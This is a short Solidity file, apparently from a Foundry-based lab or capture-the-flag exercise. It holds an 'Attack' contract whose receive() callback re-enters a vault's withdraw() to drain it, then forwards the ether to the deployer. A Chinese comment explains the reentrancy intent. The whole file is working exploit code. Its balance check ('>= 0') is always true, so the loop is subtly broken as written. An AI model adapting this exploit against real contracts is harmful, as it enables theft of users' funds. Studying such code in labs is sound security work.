// SPDX-License-Identifier: MIT

import "forge-std/Test.sol";

contract Attack {
    address public vault;
    address private owner;

    constructor(address addr) {
        vault = addr;
        owner = msg.sender;
    }

    // 回调函数，用于重入攻击合约，反复的调用目标的withdraw函数
    receive() external payable {
        if (address(vault).balance >= 0) {
            vault.call(abi.encodeWithSignature("withdraw()"));
        }
    }

    function attack() external payable {
        vault.call{value: msg.value}(abi.encodeWithSignature("deposite()"));
        vault.call(abi.encodeWithSignature("withdraw()"));
    }

    function withdraw() public {
        if (address(vault).balance >= 0) {
            payable(owner).call{value: address(this).balance}("");
        }
    }
}
